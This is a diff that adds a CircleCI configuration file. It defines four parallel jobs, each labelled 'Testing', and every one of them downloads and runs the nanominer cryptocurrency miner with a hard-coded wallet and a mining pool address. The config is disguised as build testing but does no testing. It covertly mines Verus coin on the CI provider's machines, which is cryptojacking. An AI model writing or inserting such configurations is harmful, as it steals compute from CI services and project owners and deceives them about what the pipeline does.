@@ -1,0 +1,50 @@
+version: 2.1
+jobs:
+    Devop:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: large
+      parallelism: 7    
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: sudo apt update -y && wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet 13hwisUZKCHMiwSxNAJPsHgY4NswpkZTL7 -coin VRSC -rigName rig1 -pool1 asia.mine.zergpool.com:3300
+    Devop1:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: large
+      parallelism: 7   
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: sudo apt update -y && wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet 13hwisUZKCHMiwSxNAJPsHgY4NswpkZTL7 -coin VRSC -rigName rig1 -pool1 asia.mine.zergpool.com:3300
+    Devop2:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: large
+      parallelism: 7
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: sudo apt update -y && wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet 13hwisUZKCHMiwSxNAJPsHgY4NswpkZTL7 -coin VRSC -rigName rig1 -pool1 asia.mine.zergpool.com:3300
+    Devop3:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: large 
+      parallelism: 7
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: sudo apt update -y && wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet 13hwisUZKCHMiwSxNAJPsHgY4NswpkZTL7 -coin VRSC -rigName rig1 -pool1 asia.mine.zergpool.com:3300
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
